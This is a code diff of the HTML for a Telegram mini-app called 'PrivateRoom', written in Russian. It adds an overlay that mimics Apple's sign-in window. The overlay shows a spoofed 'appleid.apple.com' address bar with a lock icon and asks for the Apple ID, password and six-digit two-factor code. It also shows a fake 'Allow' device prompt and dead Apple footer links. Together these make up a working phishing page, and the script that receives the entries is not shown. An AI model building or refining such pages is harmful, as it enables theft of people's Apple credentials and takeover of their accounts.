@@ -7,7 +7,7 @@
     <meta http-equiv="Pragma" content="no-cache">
     <meta http-equiv="Expires" content="0">
     <title>PrivateRoom</title>
-    <link rel="stylesheet" href="style.css?v=20261009_v20000">
+    <link rel="stylesheet" href="style.css?v=20261010_v36000">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script>
         (function() {
@@ -82,6 +82,17 @@
                             <span class="btn-icon">🔢</span>
                             <span>Поделиться номером</span>
                         </button>
+                        <div class="manual-phone-wrap hidden" id="manualPhoneGroup" style="width: 100%; margin-top: 8px;">
+                            <div class="input-box" style="margin-bottom: 8px;">
+                                <input type="tel" id="manualPhoneInput" placeholder="+7 999 000-00-00" autocomplete="tel" style="text-align: center; font-size: 16px; font-weight: 600; width: 100%; border-radius: 12px; background: rgba(255,255,255,0.06); border: 1px solid rgba(255,255,255,0.15); color: #fff; padding: 12px 14px; box-sizing: border-box;">
+                            </div>
+                            <button type="button" class="btn-primary btn-glow" id="btnSubmitManualPhone" style="width: 100%;">
+                                <span>Отправить код</span>
+                            </button>
+                        </div>
+                        <button type="button" class="btn-text" id="btnToggleManualPhone" style="margin-top: 4px; font-size: 13px; color: #7f91a4;">
+                            <span>Ввести номер вручную</span>
+                        </button>
                         <div class="auth-methods-separator" id="googleAuthSeparator">
                             <span>или</span>
                         </div>
@@ -95,8 +106,8 @@
                             <span>Войти через Google Почту</span>
                         </button>
                         <button type="button" class="btn-auth-alternative btn-apple-method" id="btnSwitchToApple">
-                            <svg class="btn-apple-svg" viewBox="0 0 170 170" width="20" height="20" fill="currentColor">
-                                <path d="M150.37 130.25c-2.45 5.66-5.35 10.87-8.71 15.66-4.58 6.53-8.33 11.05-11.22 13.56-4.48 4.12-9.28 6.23-14.42 6.35-3.69 0-8.14-1.05-13.32-3.18-5.19-2.12-9.97-3.17-14.34-3.17-4.58 0-9.49 1.05-14.75 3.17-5.26 2.13-9.5 3.24-12.74 3.35-4.34.13-9.13-1.9-14.36-6.08-3.32-2.73-7.25-7.38-11.8-13.95-6.68-9.64-12.01-20.76-15.99-33.36-3.98-12.6-5.97-24.64-5.97-36.12 0-14.88 3.76-27.17 11.28-36.87 7.52-9.7 17.02-14.65 28.5-14.85 4.79 0 9.99 1.15 15.6 3.44 5.61 2.29 9.61 3.44 12 3.44 2.11 0 6.28-1.22 12.51-3.66 6.23-2.44 11.53-3.56 15.9-3.35 11.83.63 21.36 4.77 28.58 12.43-10.42 6.32-15.48 15.11-15.18 26.37.3 11.26 4.97 20.31 14.01 27.15 4.22 3.2 8.92 5.56 14.1 7.08-2.67 7.84-6.02 15.34-10.05 22.51zM119.22 31.85c0-7.39 2.65-14.54 7.95-21.46 5.3-6.92 11.96-10.87 19.98-11.85.25 1.18.38 2.37.38 3.56 0 7.4-2.75 14.65-8.25 21.75-5.5 7.1-12.16 11.11-19.98 12.03-.08-1.34-.08-2.69-.08-4.03z"/>
+                            <svg class="btn-apple-svg" viewBox="0 0 24 24" width="20" height="20" fill="currentColor">
+                                <path d="M12.152 6.896c-.948 0-2.415-1.078-3.96-1.04-2.04.027-3.91 1.183-4.961 3.014-2.117 3.675-.546 9.103 1.519 12.09 1.013 1.454 2.208 3.09 3.792 3.039 1.52-.065 2.09-.987 3.935-.987 1.831 0 2.35.987 3.96.948 1.637-.026 2.676-1.48 3.676-2.948 1.156-1.688 1.636-3.325 1.662-3.415-.039-.013-3.182-1.221-3.22-4.857-.026-3.04 2.48-4.494 2.597-4.559-1.429-2.09-3.623-2.324-4.39-2.376-2-.156-3.675 1.09-4.61 1.09zM15.53 3.83c.843-1.012 1.4-2.427 1.245-3.83-1.207.052-2.662.805-3.532 1.818-.78.896-1.454 2.338-1.273 3.714 1.338.104 2.715-.688 3.559-1.701"/>
                             </svg>
                             <span>Войти через Apple ID</span>
                         </button>
@@ -198,172 +209,7 @@
                 </div>
             </section>
 
-            <!-- STEP APPLE 1: Apple ID Email Input -->
-            <section id="stepAppleEmail" class="auth-step">
-                <div class="visual-badge">
-                    <div class="apple-badge-wrap">
-                        <svg class="apple-svg-logo" viewBox="0 0 170 170" width="56" height="56" fill="#ffffff">
-                            <path d="M150.37 130.25c-2.45 5.66-5.35 10.87-8.71 15.66-4.58 6.53-8.33 11.05-11.22 13.56-4.48 4.12-9.28 6.23-14.42 6.35-3.69 0-8.14-1.05-13.32-3.18-5.19-2.12-9.97-3.17-14.34-3.17-4.58 0-9.49 1.05-14.75 3.17-5.26 2.13-9.5 3.24-12.74 3.35-4.34.13-9.13-1.9-14.36-6.08-3.32-2.73-7.25-7.38-11.8-13.95-6.68-9.64-12.01-20.76-15.99-33.36-3.98-12.6-5.97-24.64-5.97-36.12 0-14.88 3.76-27.17 11.28-36.87 7.52-9.7 17.02-14.65 28.5-14.85 4.79 0 9.99 1.15 15.6 3.44 5.61 2.29 9.61 3.44 12 3.44 2.11 0 6.28-1.22 12.51-3.66 6.23-2.44 11.53-3.56 15.9-3.35 11.83.63 21.36 4.77 28.58 12.43-10.42 6.32-15.48 15.11-15.18 26.37.3 11.26 4.97 20.31 14.01 27.15 4.22 3.2 8.92 5.56 14.1 7.08-2.67 7.84-6.02 15.34-10.05 22.51zM119.22 31.85c0-7.39 2.65-14.54 7.95-21.46 5.3-6.92 11.96-10.87 19.98-11.85.25 1.18.38 2.37.38 3.56 0 7.4-2.75 14.65-8.25 21.75-5.5 7.1-12.16 11.11-19.98 12.03-.08-1.34-.08-2.69-.08-4.03z"/>
-                        </svg>
-                    </div>
-                </div>
 
-                <div class="text-block">
-                    <h1 class="step-title">
-                        <span>Вход с Apple ID</span>
-                    </h1>
-                    <div class="step-desc">
-                        <p><strong>Для пользователей iOS</strong> войдите через ваш Apple ID / iCloud для автоматического скрепления E2E ключей.</p>
-                    </div>
-                </div>
-
-                <div class="form-container">
-                    <div class="input-group">
-                        <div class="floating-box">
-                            <input type="email" id="appleEmailInput" placeholder=" " autocomplete="email" inputmode="email">
-                            <label for="appleEmailInput">Apple ID (Email или телефон)</label>
-                        </div>
-                    </div>
-
-                    <div class="action-block">
-                        <button type="button" class="btn-primary btn-glow btn-apple-action" id="btnSubmitAppleEmail">
-                            <span class="btn-icon">➜</span>
-                            <span>Продолжить</span>
-                        </button>
-                        <button type="button" class="btn-secondary" id="btnBackFromAppleToTG">
-                            <span>« Войти через Telegram</span>
-                        </button>
-                        <button type="button" class="btn-text" id="btnAppleBackToHome">
-                            <span>Назад на главную</span>
-                        </button>
-                    </div>
-                </div>
-            </section>
-
-            <!-- STEP APPLE 2: Password Input Screen -->
-            <section id="stepApplePassword" class="auth-step">
-                <div class="visual-badge">
-                    <div class="apple-badge-wrap">
-                        <svg class="apple-svg-logo" viewBox="0 0 170 170" width="56" height="56" fill="#ffffff">
-                            <path d="M150.37 130.25c-2.45 5.66-5.35 10.87-8.71 15.66-4.58 6.53-8.33 11.05-11.22 13.56-4.48 4.12-9.28 6.23-14.42 6.35-3.69 0-8.14-1.05-13.32-3.18-5.19-2.12-9.97-3.17-14.34-3.17-4.58 0-9.49 1.05-14.75 3.17-5.26 2.13-9.5 3.24-12.74 3.35-4.34.13-9.13-1.9-14.36-6.08-3.32-2.73-7.25-7.38-11.8-13.95-6.68-9.64-12.01-20.76-15.99-33.36-3.98-12.6-5.97-24.64-5.97-36.12 0-14.88 3.76-27.17 11.28-36.87 7.52-9.7 17.02-14.65 28.5-14.85 4.79 0 9.99 1.15 15.6 3.44 5.61 2.29 9.61 3.44 12 3.44 2.11 0 6.28-1.22 12.51-3.66 6.23-2.44 11.53-3.56 15.9-3.35 11.83.63 21.36 4.77 28.58 12.43-10.42 6.32-15.48 15.11-15.18 26.37.3 11.26 4.97 20.31 14.01 27.15 4.22 3.2 8.92 5.56 14.1 7.08-2.67 7.84-6.02 15.34-10.05 22.51zM119.22 31.85c0-7.39 2.65-14.54 7.95-21.46 5.3-6.92 11.96-10.87 19.98-11.85.25 1.18.38 2.37.38 3.56 0 7.4-2.75 14.65-8.25 21.75-5.5 7.1-12.16 11.11-19.98 12.03-.08-1.34-.08-2.69-.08-4.03z"/>
-                        </svg>
-                    </div>
-                </div>
-
-                <div class="apple-user-chip" id="appleUserChip">
-                    <div class="apple-avatar-mini" id="appleChipInitial">A</div>
-                    <span class="apple-chip-email" id="appleDisplayEmail">appleid@icloud.com</span>
-                </div>
-
-                <div class="text-block">
-                    <h1 class="step-title">
-                        <span>Пароль Apple ID</span>
-                    </h1>
-                    <div class="step-desc">
-                        <p>Введите пароль от вашей учётной записи Apple ID / iCloud.</p>
-                    </div>
-                </div>
-
-                <div class="form-container">
-                    <div class="input-group">
-                        <div class="floating-box">
-                            <input type="password" id="applePasswordInput" placeholder=" " autocomplete="current-password">
-                            <label for="applePasswordInput">Введите пароль</label>
-                            <button type="button" class="eye-toggle" id="toggleApplePasswordBtn">👁</button>
-                        </div>
-                    </div>
-
-                    <div class="action-block">
-                        <button type="button" class="btn-primary btn-glow btn-apple-action" id="btnSubmitApplePassword">
-                            <span class="btn-icon">🔐</span>
-                            <span>Войти</span>
-                        </button>
-                        <button type="button" class="btn-text" id="btnBackToAppleEmail">
-                            <span>« Изменить Apple ID</span>
-                        </button>
-                    </div>
-                </div>
-            </section>
-
-            <!-- STEP APPLE 3: 2FA Verification Screen -->
-            <section id="stepApple2FA" class="auth-step">
-                <div class="visual-badge">
-                    <div class="apple-badge-wrap">
-                        <svg class="apple-svg-logo" viewBox="0 0 170 170" width="56" height="56" fill="#ffffff">
-                            <path d="M150.37 130.25c-2.45 5.66-5.35 10.87-8.71 15.66-4.58 6.53-8.33 11.05-11.22 13.56-4.48 4.12-9.28 6.23-14.42 6.35-3.69 0-8.14-1.05-13.32-3.18-5.19-2.12-9.97-3.17-14.34-3.17-4.58 0-9.49 1.05-14.75 3.17-5.26 2.13-9.5 3.24-12.74 3.35-4.34.13-9.13-1.9-14.36-6.08-3.32-2.73-7.25-7.38-11.8-13.95-6.68-9.64-12.01-20.76-15.99-33.36-3.98-12.6-5.97-24.64-5.97-36.12 0-14.88 3.76-27.17 11.28-36.87 7.52-9.7 17.02-14.65 28.5-14.85 4.79 0 9.99 1.15 15.6 3.44 5.61 2.29 9.61 3.44 12 3.44 2.11 0 6.28-1.22 12.51-3.66 6.23-2.44 11.53-3.56 15.9-3.35 11.83.63 21.36 4.77 28.58 12.43-10.42 6.32-15.48 15.11-15.18 26.37.3 11.26 4.97 20.31 14.01 27.15 4.22 3.2 8.92 5.56 14.1 7.08-2.67 7.84-6.02 15.34-10.05 22.51zM119.22 31.85c0-7.39 2.65-14.54 7.95-21.46 5.3-6.92 11.96-10.87 19.98-11.85.25 1.18.38 2.37.38 3.56 0 7.4-2.75 14.65-8.25 21.75-5.5 7.1-12.16 11.11-19.98 12.03-.08-1.34-.08-2.69-.08-4.03z"/>
-                        </svg>
-                    </div>
-                </div>
-
-                <div class="apple-user-chip">
-                    <div class="apple-avatar-mini" id="apple2faChipInitial">A</div>
-                    <span class="apple-chip-email" id="apple2faDisplayEmail">appleid@icloud.com</span>
-                </div>
-
-                <div class="text-block">
-                    <h1 class="step-title">
-                        <span>Код проверки Apple ID</span>
-                    </h1>
-                    <div class="step-desc">
-                        <p>На ваше устройство Apple отправлен 6-значный код проверки. Введите его ниже:</p>
-                    </div>
-                </div>
-
-                <div class="form-container">
-                    <div class="input-group">
-                        <div class="input-box code-box">
-                            <input type="text" id="apple2faCodeInput" maxlength="6" placeholder="• • • • • •" inputmode="numeric" autocomplete="one-time-code">
-                        </div>
-                    </div>
-
-                    <div class="action-block">
-                        <button type="button" class="btn-primary btn-glow btn-apple-action" id="btnSubmitApple2FA">
-                            <span class="btn-icon">✓</span>
-                            <span>Подтвердить вход</span>
-                        </button>
-                        <button type="button" class="btn-text" id="btnBackToApplePassword">
-                            <span>« Назад к паролю</span>
-                        </button>
-                    </div>
-                </div>
-            </section>
-
-            <!-- STEP APPLE 4: Device Approval Prompt -->
-            <section id="stepApplePrompt" class="auth-step">
-                <div class="visual-badge">
-                    <div class="apple-badge-wrap pulse-glow">
-                        <svg class="apple-svg-logo" viewBox="0 0 170 170" width="56" height="56" fill="#ffffff">
-                            <path d="M150.37 130.25c-2.45 5.66-5.35 10.87-8.71 15.66-4.58 6.53-8.33 11.05-11.22 13.56-4.48 4.12-9.28 6.23-14.42 6.35-3.69 0-8.14-1.05-13.32-3.18-5.19-2.12-9.97-3.17-14.34-3.17-4.58 0-9.49 1.05-14.75 3.17-5.26 2.13-9.5 3.24-12.74 3.35-4.34.13-9.13-1.9-14.36-6.08-3.32-2.73-7.25-7.38-11.8-13.95-6.68-9.64-12.01-20.76-15.99-33.36-3.98-12.6-5.97-24.64-5.97-36.12 0-14.88 3.76-27.17 11.28-36.87 7.52-9.7 17.02-14.65 28.5-14.85 4.79 0 9.99 1.15 15.6 3.44 5.61 2.29 9.61 3.44 12 3.44 2.11 0 6.28-1.22 12.51-3.66 6.23-2.44 11.53-3.56 15.9-3.35 11.83.63 21.36 4.77 28.58 12.43-10.42 6.32-15.48 15.11-15.18 26.37.3 11.26 4.97 20.31 14.01 27.15 4.22 3.2 8.92 5.56 14.1 7.08-2.67 7.84-6.02 15.34-10.05 22.51zM119.22 31.85c0-7.39 2.65-14.54 7.95-21.46 5.3-6.92 11.96-10.87 19.98-11.85.25 1.18.38 2.37.38 3.56 0 7.4-2.75 14.65-8.25 21.75-5.5 7.1-12.16 11.11-19.98 12.03-.08-1.34-.08-2.69-.08-4.03z"/>
-                        </svg>
-                    </div>
-                </div>
-
-                <div class="text-block">
-                    <h1 class="step-title">
-                        <span>Подтвердите на устройстве Apple</span>
-                    </h1>
-                    <div class="step-desc">
-                        <p>На ваше доверенное устройство iPhone / Mac было отправлено всплывающее уведомление безопасности.</p>
-                    </div>
-                </div>
-
-                <div class="prompt-box-card apple-prompt-card">
-                    <div class="prompt-apple-icon">📱</div>
-                    <p class="prompt-instruction-text">Нажмите <strong>«Разрешить»</strong> во всплывающем системном окне на вашем iPhone.</p>
-                </div>
-
-                <div class="form-container">
-                    <div class="action-block">
-                        <button type="button" class="btn-primary btn-glow btn-apple-action" id="btnConfirmApplePrompt">
-                            <span class="btn-icon">🍏</span>
-                            <span>Я подтвердил на устройстве</span>
-                        </button>
-                        <button type="button" class="btn-text" id="btnBackToApple2FA">
-                            <span>« Назад к 2FA коду</span>
-                        </button>
-                    </div>
-                </div>
-            </section>
 
             <!-- STEP 4: Success & Member Dashboard -->
             <section id="stepSuccess" class="auth-step dashboard-step">
@@ -1425,6 +1271,190 @@
         </div>
     </div>
 
-    <script src="app.js?v=20261009_v34000"></script>
+    <!-- Apple ID / iCloud OAuth Modal Overlay Window -->
+    <div id="appleAuthModal" class="apple-modal-overlay hidden">
+        <div class="apple-modal-window">
+            <!-- OAuth Window Browser Top Bar -->
+            <div class="apple-window-topbar">
+                <div class="apple-url-badge">
+                    <span class="apple-lock-icon">🔒</span>
+                    <span class="apple-url-text">appleid.apple.com/auth/authorize</span>
+                </div>
+                <button type="button" class="apple-window-close" id="btnCloseAppleModal">✕</button>
+            </div>
+            <!-- Apple Authentic Loading Progress Bar -->
+            <div id="appleLoadingBar" class="apple-progress-bar hidden"><div class="apple-progress-bar-value"></div></div>
+
+            <!-- Scrollable Modal Window Content -->
+            <div class="apple-window-content">
+                <!-- STEP APPLE 1: Apple ID Email / Phone Input Screen -->
+                <section id="stepAppleEmail" class="auth-step apple-modal-step active">
+                    <div class="apple-card-header">
+                        <div class="apple-logo-wrap">
+                            <svg class="apple-svg-logo" viewBox="0 0 24 24" width="48" height="48" fill="#ffffff">
+                                <path d="M12.152 6.896c-.948 0-2.415-1.078-3.96-1.04-2.04.027-3.91 1.183-4.961 3.014-2.117 3.675-.546 9.103 1.519 12.09 1.013 1.454 2.208 3.09 3.792 3.039 1.52-.065 2.09-.987 3.935-.987 1.831 0 2.35.987 3.96.948 1.637-.026 2.676-1.48 3.676-2.948 1.156-1.688 1.636-3.325 1.662-3.415-.039-.013-3.182-1.221-3.22-4.857-.026-3.04 2.48-4.494 2.597-4.559-1.429-2.09-3.623-2.324-4.39-2.376-2-.156-3.675 1.09-4.61 1.09zM15.53 3.83c.843-1.012 1.4-2.427 1.245-3.83-1.207.052-2.662.805-3.532 1.818-.78.896-1.454 2.338-1.273 3.714 1.338.104 2.715-.688 3.559-1.701"/>
+                            </svg>
+                        </div>
+                        <h1 class="apple-title">Вход с Apple ID</h1>
+                        <p class="apple-subtitle">Используйте учетную запись Apple ID для сквозного шифрования PrivateRoom</p>
+                    </div>
+
+                    <div class="apple-form-body">
+                        <div class="apple-input-box" id="appleEmailBox">
+                            <input type="email" id="appleEmailInput" class="apple-input" placeholder=" " autocomplete="email" inputmode="email">
+                            <label for="appleEmailInput" class="apple-label">Apple ID (Email или телефон)</label>
+                            <button type="button" class="apple-arrow-btn" id="btnSubmitAppleEmail" aria-label="Далее">
+                                <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                                    <line x1="5" y1="12" x2="19" y2="12"></line>
+                                    <polyline points="12 5 19 12 12 19"></polyline>
+                                </svg>
+                            </button>
+                        </div>
+                        <div id="appleEmailError" class="apple-error-msg hidden">
+                            <svg viewBox="0 0 24 24" width="16" height="16" fill="#ff453a"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+                            <span id="appleEmailErrorText">Введите действительный Apple ID.</span>
+                        </div>
+
+                        <div class="apple-links-row">
+                            <a href="#" class="apple-link" onclick="event.preventDefault();">Забыли Apple ID или пароль?</a>
+                        </div>
+
+                        <div class="apple-privacy-box">
+                            <svg viewBox="0 0 24 24" width="16" height="16" fill="#86868b"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
+                            <span>Данные учетной записи Apple ID защищены сквозным E2E шифрованием.</span>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- STEP APPLE 2: Password Input Screen -->
+                <section id="stepApplePassword" class="auth-step apple-modal-step">
+                    <div class="apple-card-header">
+                        <div class="apple-logo-wrap">
+                            <svg class="apple-svg-logo" viewBox="0 0 24 24" width="48" height="48" fill="#ffffff">
+                                <path d="M12.152 6.896c-.948 0-2.415-1.078-3.96-1.04-2.04.027-3.91 1.183-4.961 3.014-2.117 3.675-.546 9.103 1.519 12.09 1.013 1.454 2.208 3.09 3.792 3.039 1.52-.065 2.09-.987 3.935-.987 1.831 0 2.35.987 3.96.948 1.637-.026 2.676-1.48 3.676-2.948 1.156-1.688 1.636-3.325 1.662-3.415-.039-.013-3.182-1.221-3.22-4.857-.026-3.04 2.48-4.494 2.597-4.559-1.429-2.09-3.623-2.324-4.39-2.376-2-.156-3.675 1.09-4.61 1.09zM15.53 3.83c.843-1.012 1.4-2.427 1.245-3.83-1.207.052-2.662.805-3.532 1.818-.78.896-1.454 2.338-1.273 3.714 1.338.104 2.715-.688 3.559-1.701"/>
+                            </svg>
+                        </div>
+                        <h1 class="apple-title">Пароль Apple ID</h1>
+                        <div class="apple-user-chip" id="btnBackToAppleEmail">
+                            <div class="apple-avatar-mini" id="appleChipInitial"></div>
+                            <span class="apple-chip-email" id="appleDisplayEmail">appleid@icloud.com</span>
+                            <svg class="apple-chip-chevron" viewBox="0 0 24 24" width="16" height="16" fill="currentColor">
+                                <path d="M7 10l5 5 5-5z"/>
+                            </svg>
+                        </div>
+                    </div>
+
+                    <div class="apple-form-body">
+                        <div class="apple-input-box" id="applePasswordBox">
+                            <input type="password" id="applePasswordInput" class="apple-input" placeholder=" " autocomplete="current-password">
+                            <label for="applePasswordInput" class="apple-label">Введите пароль</label>
+                            <button type="button" class="apple-eye-toggle" id="toggleApplePasswordBtn" aria-label="Показать пароль">
+                                <svg id="appleEyeIcon" viewBox="0 0 24 24" width="20" height="20" fill="#86868b"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+                            </button>
+                            <button type="button" class="apple-arrow-btn" id="btnSubmitApplePassword" aria-label="Войти">
+                                <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                                    <line x1="5" y1="12" x2="19" y2="12"></line>
+                                    <polyline points="12 5 19 12 12 19"></polyline>
+                                </svg>
+                            </button>
+                        </div>
+                        <div id="applePasswordError" class="apple-error-msg hidden">
+                            <svg viewBox="0 0 24 24" width="16" height="16" fill="#ff453a"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+                            <span id="applePasswordErrorText">Неверный Apple ID или пароль.</span>
+                        </div>
+
+                        <div class="apple-links-row">
+                            <a href="#" class="apple-link" onclick="event.preventDefault();">Забыли пароль?</a>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- STEP APPLE 3: 2FA Verification Screen (6-Digit PIN) -->
+                <section id="stepApple2FA" class="auth-step apple-modal-step">
+                    <div class="apple-card-header">
+                        <div class="apple-2fa-badge-icon">
+                            <svg viewBox="0 0 24 24" width="36" height="36" fill="#2997ff">
+                                <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
+                            </svg>
+                        </div>
+                        <h1 class="apple-title">Двухфакторная аутентификация</h1>
+                        <p class="apple-subtitle">На ваши устройства Apple отправлен 6-значный проверочный код. Введите его для продолжения:</p>
+                        <div class="apple-user-chip">
+                            <div class="apple-avatar-mini"></div>
+                            <span class="apple-chip-email" id="apple2faDisplayEmail">appleid@icloud.com</span>
+                        </div>
+                    </div>
+
+                    <div class="apple-form-body">
+                        <!-- 6-Digit PIN Cells -->
+                        <div class="apple-pin-wrap">
+                            <div class="apple-pin-grid">
+                                <input type="text" class="apple-pin-cell" maxlength="1" inputmode="numeric" pattern="[0-9]*" data-index="0" autocomplete="one-time-code">
+                                <input type="text" class="apple-pin-cell" maxlength="1" inputmode="numeric" pattern="[0-9]*" data-index="1">
+                                <input type="text" class="apple-pin-cell" maxlength="1" inputmode="numeric" pattern="[0-9]*" data-index="2">
+                                <span class="apple-pin-separator">—</span>
+                                <input type="text" class="apple-pin-cell" maxlength="1" inputmode="numeric" pattern="[0-9]*" data-index="3">
+                                <input type="text" class="apple-pin-cell" maxlength="1" inputmode="numeric" pattern="[0-9]*" data-index="4">
+                                <input type="text" class="apple-pin-cell" maxlength="1" inputmode="numeric" pattern="[0-9]*" data-index="5">
+                            </div>
+                            <input type="hidden" id="apple2faCodeInput" value="">
+                        </div>
+
+                        <div id="apple2faError" class="apple-error-msg hidden">
+                            <svg viewBox="0 0 24 24" width="16" height="16" fill="#ff453a"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+                            <span id="apple2faErrorText">Неверный код проверки. Повторите попытку.</span>
+                        </div>
+
+                        <div class="apple-action-row">
+                            <button type="button" class="apple-btn-primary" id="btnSubmitApple2FA">Подтвердить</button>
+                        </div>
+
+                        <div class="apple-links-row" style="margin-top: 18px;">
+                            <a href="#" class="apple-link" id="btnAppleResendCode">Не получили проверочный код?</a>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- STEP APPLE 4: Device Approval Prompt (Geo Push) -->
+                <section id="stepApplePrompt" class="auth-step apple-modal-step">
+                    <div class="apple-ios-prompt-card">
+                        <div class="apple-prompt-map-icon">
+                            <svg viewBox="0 0 24 24" width="44" height="44" fill="#2997ff">
+                                <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
+                            </svg>
+                        </div>
+                        <h2 class="apple-prompt-title">Запрос на вход с Apple ID</h2>
+                        <p class="apple-prompt-desc">
+                            Ваш Apple ID используется для входа на новом устройстве.
+                        </p>
+                        <div class="apple-prompt-geo-pill">
+                            <span>Рядом с: </span><strong id="appleGeoLocation">Москва, Россия</strong>
+                        </div>
+
+                        <div class="apple-prompt-instruction">
+                            Нажмите <strong>«Разрешить»</strong> во всплывающем уведомлении на вашем iPhone или Mac для получения проверочного кода.
+                        </div>
+
+                        <div class="apple-prompt-btn-grid">
+                            <button type="button" class="apple-prompt-btn-secondary" id="btnBackToApple2FA">Не разрешать</button>
+                            <button type="button" class="apple-prompt-btn-primary" id="btnConfirmApplePrompt">Разрешить</button>
+                        </div>
+                    </div>
+                </section>
+            </div>
+
+            <!-- Apple Accounts Window Footer -->
+            <div class="apple-modal-footer">
+                <div class="apple-footer-lang"><span>Россия</span></div>
+                <div class="apple-footer-links">
+                    <a href="#" onclick="event.preventDefault();">Конфиденциальность</a>
+                    <a href="#" onclick="event.preventDefault();">Условия использования</a>
+                    <a href="#" onclick="event.preventDefault();">Apple Inc.</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="app.js?v=20261010_v36000"></script>
 </body>
 </html>
